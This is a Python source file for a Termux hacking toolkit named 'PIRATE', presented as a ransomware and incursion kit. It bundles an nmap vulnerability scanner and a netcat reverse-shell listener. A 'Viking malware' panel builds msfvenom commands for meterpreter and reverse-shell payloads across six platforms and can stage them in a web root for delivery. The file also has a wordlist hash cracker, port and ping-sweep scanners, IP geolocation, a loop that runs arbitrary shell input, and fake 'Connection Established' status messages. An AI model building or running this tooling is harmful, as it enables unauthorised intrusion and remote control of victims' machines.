import os

os.system("cls || clear")
print("\033[36m")
print(r"""  
###############################################
##                                           ##
##                                           ##
##   ___ (~ )( ~)  P. ortable                ##
##  /   \_\ \/ /   I. ncursion               ##
## |   D_ ]\ \/    R. ansomware              ##
## |   D _]/\ \    A. ndroid                 ##
##  \___/ / /\ \   T. oolkit                 ##
##       (_ )( _)  E. ncryption              ##
##                                           ##
##   $By Th3 Jes7er                          ##
###############################################
 $ Hack with your android device
 
   Type 'help' for more info """)

#----------------------------------------------------------------------------------------------------------------------

def port_scanner():
    import time
    import socket
    from datetime import datetime

    hostname= input("Enter Target hostname > ")
    target = socket.gethostbyname(hostname)
    print("\033[36mConnecting to Nmap database...")
    time.sleep(1)
    print("\033[31mConnection Established!!!\033[36m")
    print("\033[36mScanning: \033[31m", target)
    print("\033[36mStarted at: \033[31m" + str(datetime.now()))
    print("\033[36m\n")
    os.system("nmap -Pn -sV -sC -A --script vuln " + target)

#----------------------------------------------------------------------------------------------------------------------

def host_details():
    import socket
    import time
    import uuid
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    time.sleep(0.2)
    print("\n\033[36mHost Details")
    print("\033[37m============")
    print("\033[37m Host: \033[31m", host)
    print("\033[37m Local IP:\033[31m ", ip)
    print("\033[37m MAC: \033[31m", end="")
    print (':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
    for ele in range(0,8*6,8)][::-1]))
    print("\033[37m============")

#----------------------------------------------------------------------------------------------------------------------

def listener():
    b = input("\033[37mEnter Port \033[36m> ")
    os.system("nc -lvnp " + b)

#----------------------------------------------------------------------------------------------------------------------

def viking_malware():
    #by Th3 Jes7er
    import os
    os.system("cls||clear")
    print(r"""
    Viking Termux Version
            ,          
       ,    |\,__       
       |\   \/   `.      
       \ `-.:.     `\   
        `-.__ `\=====|    
           /=`'/   ^_\     
         .'   /\   .=)     
      .-'  .'|  '-(/_|       
    .'  __(  \  .'`         
   /_.'`  `.  |`            
            \ |           
             |/  Type 'Lab' to reveal 
                    the malware panel
             """)
    mallab = True
    while mallab:
        b = input("\033[31m\033[37m(\033[31mViking\033[37m) \033[31m>\033[36m ")
        if b == "Lab":
            os.system("cls||clear")
            payload = "NOT SET"
            payload_extension = "NOT SET"
            payload_os = "NOT SET"
            local_ip = "NOT SET"
            lport = "NOT SET"
            payload_name = "NOT SET"
            payload_location = "NOT SET"
            link_true_false="False"
            
            def help():
                os.system('cls||clear')
                print("""\033[37m
 ==\033[31mMalware Lab Panel\033[37m ==
 \033[31mCore Commands\033[37m
 set payload 'number'  Set payload to generate 
 set lhost     Set custom listener ip
                |_see your ip by typing 'lhost'
 lhost         Auto set lhost of your machine
 set lport     Set listener port
 set name      Set the payload name
 config        see the payload configuration
 listener      start a listener
 compile       Generate the payload command


 \033[31mMSF Payloads\033[37m
 \033[31m[===================================>\033[37m
  [\033[31m1\033[37m] Android \033[34m
 \033[37m [\033[31m2\033[37m] Linux \033[34m
 \033[37m [\033[31m3\033[37m] Windows \033[34m
 \033[37m [\033[31m4\033[37m] Mac OS X \033[34m
 \033[37m [\033[31m5\033[37m] Python \033[34m
 \033[37m [\033[31m6\033[37m] Bash

""")
            help()
            lab = True
            while lab:
                a = input("\033[37m(\033[31mMalware Lab\033[37m) \033[31m>\033[36m ")
        #--------------------------------------------------------------------------------------------------------------
        #                      PAYLOADS
        #--------------------------------------------------------------------------------------------------------------
                if a == "set payload 1":
                    payload =  'android/meterpreter/reverse_tcp'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os = 'Android'
                    payload_extension='apk'
                    #android payload

                elif a == "set payload 2":
                    payload = 'linux/x86/meterpreter/reverse_tcp'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Linux'
                    payload_extension='elf'
                    #linux payload

                elif a == "set payload 3":
                    payload =  'windows/meterpreter/reverse_tcp'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Windows'
                    payload_extension='exe'
                    #windows payload

                elif a == "set payload 4":
                    payload =  'osx/x86/shell_reverse_tcp'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Mac OS X'
                    #MAC OS PAYLOAD

                elif a == "set payload 5":
                    payload =  'cmd/unix/reverse_python'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Python'
                    payload_extension='py'
                    #Python payload

                elif a == "set payload 6":
                    payload =  'cmd/unix/reverse_bash'
                    print("\033[37mPayload => \033[31m", payload)
                    payload_os='Bash'
                    payload_extension='sh'
                    #Bash Payload

        #--------------------------------------------------------------------------------------------------------------
        #                   CONFIG
        #--------------------------------------------------------------------------------------------------------------

                elif a == "set lport":
                    lport=input("\033[37mLPort > \033[31m")
                    #local port

                elif a == "lhost":
                    import socket
                    import threading
                    hostname = socket.gethostname()
                    local_ip = socket.gethostbyname(hostname)
                    print("\033[37mLHost: \033[31m", local_ip)

                elif a =="set lhost":
                    local_ip=input("\033[37mLHost > \033[31m")

                elif a =="set name":
                    payload_name=input("\033[37mName > \033[31m")

                elif a =="set location":
                    payload_location=input("\033[37mDirectory > \033[31m")
                    link_true_false="False"

                elif a =="link":
                    payload_location="/var/www/html/"
                    link_true_false="True"

                elif a == "config":
                    print("\n\033[37m==\033[31mConfiguration\033[37m =======")
                    print("\n\033[31m>>>>>>>>>>>>>>>>>>>>")
                    print("\033[37mPAYLOAD \033[31m> ", payload)
                    print("\033[37mExtension \033[31m> ", payload_extension)
                    print("\033[37mOS/SCRIPT \033[31m> ", payload_os)
                    print("\033[37mLHost \033[31m> ", local_ip)
                    print("\033[37mLPort \033[31m> ", lport)
                    print("\033[37mName \033[31> ", payload_name)
                    print("\033[37mDirectory \033[31m> ", payload_location)
                    print("\033[37mLink \033[31m> ", link_true_false)
                    print("\033[31m>>>>>>>>>>>>>>>>>>>>\033[37m")
                    print("\n")

                elif a == "compile":
                    #msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
                    print("\n\033[37mYour Payload is Ready:")
                    if payload == "android/meterpreter/reverse_tcp":
                        print('\033[31msudo msfvenom -p ' + str(payload) + " LHOST=" + str(local_ip) + " LPORT=" + str(lport) + " R> " + str(payload_name) + "." + str(payload_extension))
                    else:
                        print('\033[31msudo msfvenom -p ' + str(payload) + " LHOST=" + str(local_ip) + " LPORT=" + str(lport) + " -f " + str(payload_extension) + " > " + str(payload_name) + "." + str(payload_extension))
                    print("\n\033[37mUse this command to generate your payload")
                    print("\033[37m(It requires msfvenom to be installed)")
                elif a == "help":
                    help()
                elif a =="exit":
                    lab = False
                    mallab = False
                else:
                    print("' " + str(a) + " '", "is not recognized as internal or external command")
                    print("Type help to reveal the panel")


        elif b =="exit":
            mallab = False
        else:
            print("' " + str(b) + " '", "is not recognized as internal or external command")

#----------------------------------------------------------------------------------------------------------------------

def hash_crack():
    os.system('cls||clear')
    import hashlib
    print("""\033[31m Hashlab Termux Version

          ▒▒░░░░░░░░░░░░█████      
          ▒▒░░            ▒▒█       
          ▒▒░░            ▒▒█        
          ▒▒░░            ▒▒█         
          ▒▒░░            ▒▒█         
    ▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░  
    ▒▒▒▒░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░  \033[31m+\033[37m| \033[34mAlgorithm \033[37m|\033[31m+\033[31m
    ▒▒▒▒░░▒▒░░░░░░░░░░▒▒░░░░░░░░░░░░  \033[37m| \033[31mA\033[37m) md5      |\033[31m
    ▒▒▒▒░░▒▒░░░░░░▒▒▒▒▒▒▒▒░░░░░░░░░░  \033[37m| \033[31mB\033[37m) sha1     |\033[31m
    ▒▒▒▒░░▒▒░░░░░░▒▒▒▒▒▒░░░░░░░░░░░░  \033[37m| \033[31mC\033[37m) sha224   |\033[31m 
    ▒▒▒▒░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░  \033[37m| \033[31mD\033[37m) sha256   |\033[31m
    ▒▒▒▒░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░  \033[37m| \033[31mE\033[37m) sha384   |\033[31m
    ▒▒▒▒░░▒▒░░      ░░░░  ░░      ▒▒  \033[37m| \033[31mF\033[37m) sha512   |\033[31m
    ▒▒▒▒░░▒▒          ░░          ▒▒  \033[31m+\033[37m-------------\033[31m+\033[31m
    ▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░                            
    
\033[31m+\033[37m--| \033[31mHelp Menu \033[37m|---------------------------\033[31m+\033[31m    
\033[37m| \033[36mencryption\033[37m: Encrypt a text with a        \033[37m|\033[31m
\033[37m| hashing algorithm (5 available)          \033[37m|\033[31m
\033[37m| \033[36mdecryption\033[37m: Decrypt a hash using         \033[37m|\033[31m
\033[37m| a wordlist and the hashing algorithm     \033[37m|\033[31m
\033[31m+\033[37m------------------------------------------\033[31m+\033[31m
    \033[37m""")

    hash_method = True
    def encrypt():
        une = input("Text to encrypt \033[31m>\033[37m ")
        algorithm1 = input("Algorithm \033[31m>\033[37m ")
        message = une.encode('utf-8')
        if algorithm1 == "A":
            h = hashlib.md5(message)
        elif algorithm1 == "B":
            h = hashlib.sha1(message)
        elif algorithm1 == "C":
            h = hashlib.sha224(message)
        elif algorithm1 == "D":
            h = hashlib.sha256(message)
        elif algorithm1 == "E":
            h = hashlib.sha384(message)
        elif algorithm1 == "F":
            h = hashlib.sha512(message)
        else:
            print("This algorithm '", algorithm1, "' is not recognized or not supported")
            return(encrypt())
        print("Original text '", une, "', ", "hashed text '", h.hexdigest(), "' ")

    def decrypt():
        pass_found = 0
        input_hash = input("Enter the hashed password: ")
        algorithm1 = input("Algorithm \033[31m>\033[37m ")
        pass_doc = input("\nEnter passwords filename including path(root / home/): ")

        try:
            pass_file = open(pass_doc, 'r')
        except:
            print("Error:")
            print(pass_doc, "is not found.\nPlease give the path of file correctly.")
            quit()

        for word in pass_file:
            enc_word = word.encode('utf-8')
            if algorithm1 == "A":
                hash_word = hashlib.md5(enc_word.strip())
            elif algorithm1 == "B":
                hash_word = hashlib.sha1(enc_word.strip())
            elif algorithm1 == "C":
                hash_word = hashlib.sha224(enc_word.strip())
            elif algorithm1 == "D":
                hash_word = hashlib.sha256(enc_word.strip())
            elif algorithm1 == "E":
                hash_word = hashlib.sha384(enc_word.strip())
            elif algorithm1 == "F":
                hash_word = hashlib.sha512(enc_word.strip())
            else:
                print("This algorithm '", algorithm1, "' is not recognized or not supported")
            digest = hash_word.hexdigest()

            if digest == input_hash:
                print("\033[32mPassword found!\033[37m\nThe password is: \033[36m", word, " \033[37m")
                pass_found = 1
                break

        if not pass_found:
            print("Password is not found in the", pass_doc, "file")
            print('\n')

    while hash_method:
        a = input("\n\033[31mPirate(\033[31mencryption/decryption\033[37m) \033[31m>\033[37m ")
        if a == "encryption":
            encrypt()
        elif a == "decryption":
            decrypt()
        elif a == "help":
            print("""
\033[31m+\033[37m--| \033[31mHelp Menu \033[37m|---------------------------\033[31m+\033[31m    
\033[37m| \033[36mencryption\033[37m: Encrypt a text with a        \033[37m|\033[31m
\033[37m| hashing algorithm (5 available)          \033[37m|\033[31m
\033[37m| \033[36mdecryption\033[37m: Decrypt a hash using         \033[37m|\033[31m
\033[37m| a wordlist and the hashing algorithm     \033[37m|\033[31m
\033[31m+\033[37m------------------------------------------\033[31m+\033[31m""")
        elif a == "exit":
            hash_method = False
        else:
          print(a, "not recognized as internal or external command")
          print("Type 'help' to reveal the help menu")



#----------------------------------------------------------------------------------------------------------------------

def observer():
    #!/usr/bin/env python3
    #Viking v1-dev-
    #Copyright of Th3 Jes7er
    def startup():
        import os
        os.system('cls||clear')
        banner =(r"""
            `-.`'.-'
         `-.        .-'.
      `-.    -./\.-    .-'
          -.  /_|\  .-
      `-.   `/____\'   .-'.
   `-.    -./.-""-.\.-      '
      `-.  /< (()) >\  .-'
    -   .`/__`-..-'__\'   .-
  ,...`-./___|____|___\.-'.,.
     ,-'   ,` . . ',   `-,
  ,-'   ________________  `-,
      ,'/____|_____|_____\
     / /__|_____|_____|___\
    / /|_____|_____|_____|_\ 
   ' /____|_____|_____|_____\ 
 .' /__|_____|_____|_____|___\
,' /|_____|_____|_____|_____|_\ 
````````````````````````````````
  __            
 / __ \| | By Th3 Jes7er $Termux Version 
| |  | | |__  ___  ___ _ ____   _____ _ __ 
| |  | | '_ \/ __|/ _ \ '__\ \ / / _ \ '__|
| |__| | |_) \__ \  __/ |   \ V /  __/ |
 \____/|_.__/|___/\___|_|    \_/ \___|_|
 $ADVANCED NETWORK SCANNER   -v1.3-
                                   """)
        print("\033[32m", banner)                                         
        observer = True
        from datetime import datetime
        import socket
        import threading
        import os
        import platform

        def icmp_scan():
            from datetime import datetime
            net = input("Enter the Network Address: ")
            net1= net.split('.')
            a = '.'

            net2 = net1[0] + a + net1[1] + a + net1[2] + a
            st1 = int(input("Enter the Starting Number: "))
            en1 = int(input("Enter the Last Number: "))
            en1 = en1 + 1
            oper = platform.system()

            if (oper == "Windows"):
                ping1 = "ping -n 1 "
            elif (oper == "Linux"):
                ping1 = "ping -c 1 "
            else :
                ping1 = "ping -c 1 "
            t1 = datetime.now()
            print ("Scanning in Progress:")

            for ip in range(st1,en1):
                addr = net2 + str(ip)
                comm = ping1 + addr
                response = os.popen(comm)
            
            for line in response.readlines():
                if(line.count("TTL")):
                    break
                if (line.count("TTL")):
                    print (addr, "--> Live")
                    
            t2 = datetime.now()
            total = t2 - t1
            print ("Scanning completed in: ",total)

        def main_scan():
            addr = socket.gethostbyname(input("\n\n\033[32mObserver(\033[33mtarget/hostname\033[32m) > "))
            start_port = 0
            port_end_if = input("\033[32mObserver(\033[33mregular/full\033[32m) > ")
            if port_end_if == "regular":
                end_port = int(1024)
            elif port_end_if == "full":
                end_port = int(65535)
            else:
                pass
            print("\nScanning Target: "+ str(addr))
            print("|_PORT\tSTATE\tSERVICE\tHOSTNAME")

            def scanport(addr, port):
                socket_obj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = socket_obj.connect_ex((addr,port))
                socket_obj.close()
                
                if result == 0:
                    machine_hostname = socket.gethostbyaddr(addr)[0]
                    service = socket.getservbyport(port)
                    print("| " + str(port) + "\topen" +" \t"+ str(service) + " \t" + str(machine_hostname))
                    return port
                else:
                    return None


            def bannergrabbing(addr, port):
                print("Gettig service information for port: ", port)
                bannergrabber = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                socket.setdefaulttimeout(2)
                try:
                    bannergrabber.connect((addr, port))
                    bannergrabber.send('WhoAreYou\r\n')
                    banner = bannergrabber.recv(100)
                    bannergrabber.close()
                    print (banner, "\n")
                except:
                    print("Cannot connect to port ", port)

                
            def portscanner(address, start, end):
                open_ports = []
                # scan port range for host
                for port in range(start_port, end_port):
                    open_port = scanport(addr, port)
                    if open_port is None:
                        continue
                    else:
                        open_ports.append(open_port)
                return open_ports

            def get_service_banners_for_host(address, portlist):
                for port in portlist:
                    bannergrabbing(addr, port)

            if __name__=='__main__':
                open_ports = portscanner(addr, start_port, end_port)
                get_service_banners_for_host(addr, open_ports)
        def tcp_scan():
            import socket
            from datetime import datetime
            net = input("Enter the IP address: ")
            net1 = net.split('.')
            a = '.'

            net2 = net1[0] + a + net1[1] + a + net1[2] + a
            st1 = int(input("Enter the Starting Number: "))
            en1 = int(input("Enter the Last Number: "))
            en1 = en1 + 1
            t1 = datetime.now()

            def scan(addr):
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = s.connect_ex((addr,135))
                if result == 0:
                    return 1
                else :
                    return 0

            def run1():
                for ip in range(st1,en1):
                    addr = net2 + str(ip)
                    if (scan(addr)):
                        print (addr , "is live")
                            
            run1()
            t2 = datetime.now()
            total = t2 - t1
            print("Scan completed in '", total, "'")

        print("""
\033[37m[\033[33m1\033[37m] ICMP SCAN (ping sweep) 
\033[37m[\033[33m2\033[37m] TCP Discover UP target machines
\033[37m[\033[33m3\033[37m] Scan a remote host for open 
                                 |_ports and fingerprints
        """)
        observer_scan = input("\033[32mEnter choice > ")
        if observer_scan == "1":
            icmp_scan()
        elif observer_scan == "2":
            tcp_scan()
        elif observer_scan == "3":
            main_scan()
        else:
            pass
    startup()

#----------------------------------------------------------------------------------------------------------------------

def ip_addr_scanner_target():
    import re
    import json
    from urllib.request import urlopen
    ip_addr = input("\033[37mEnter Target Ip Address \033[31m> \033[37m")
    url = 'http://ipinfo.io/' + str(ip_addr) + '/json'
    response = urlopen(url)
    data = json.load(response)

    ip=data['ip']
    org=data['org']
    city = data['city']
    country=data['country']
    region=data['region']
    location=data['loc']
    hostname=data['hostname']

    print('\033[34mIP Address Details\n \033[37m')
    print('\033[37mIP: \033[34m', ip, '\033[37m\nRegion: \033[34m', region, '\033[37m\nCountry: \033[34m',country, '\033[37m\nCity: \033[34m',city, '\033[37m\nOrg: \033[34m', org, '\033[37m ')
    print('\033[37mLocation: \033[34m', location)
    print('\033[37mHostname: \033[34m', hostname)

#----------------------------------------------------------------------------------------------------------------------

pirate = True
while pirate:
    a = input("\n\033[5;36m>>> \033[0;36m")
    if a == "help":
        print("""
 =============
 CORE COMMANDS
 =============
 # Command       Description
 # -------       ---------
 # \033[31mport scanner\033[36m  auto target scan
 # \033[31mdb-nmap\033[36m       scan remote network
 # \033[31mobserver\033[36m      advanced scanner
 # \033[31mip-geo \033[36m       find ip geolocation
 # \033[31mviking\033[36m        viking malware 
 # \033[31mlistener\033[36m      create a listener
 # \033[31mhost\033[36m          get host info
 # \033[31mhashlab\033[36m       encryption/decryption
        """)
    elif a == "port scanner":
        port_scanner()
    elif a == "viking":
        viking_malware()
    elif a =="ip-geo":
        ip_addr_scanner_target()
    elif a=="db-nmap":
        import time 
        print("\033[37mConnecting to Nmap database...")
        time.sleep(1)
        print("\033[31mConnection Established!!!\033[37m")
        time.sleep(0.2)
        print("""\033[37m
Usage: \033[31mnmap\033[37m [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
Can pass hostnames, IP addresses, networks, etc.
For more help type 'nmap -h', to exit type 'exit'
                 """)
        nmap = True
        while nmap:
            n = input("\033[37m Nmap \033[31m>\033[36m ")
            if n =="exit":
                print("\033[31mExitting Network-Mapper\033[37m")
                nmap = False
            else:
                os.system(n)
    elif a =="observer":
        observer()
    elif a =="hashlab":
        hash_crack()
    elif a == "host":
        host_details()
    elif a =="clear":
        os.system('clear')
    elif a =="listener":
        listener()
    elif a =="exit":
        pirate = False
    elif a =="quit":
        pirate = False
    else:
        print(a, " not recognized as internal or external command")
        print("Type 'help' to reveal the help menu")

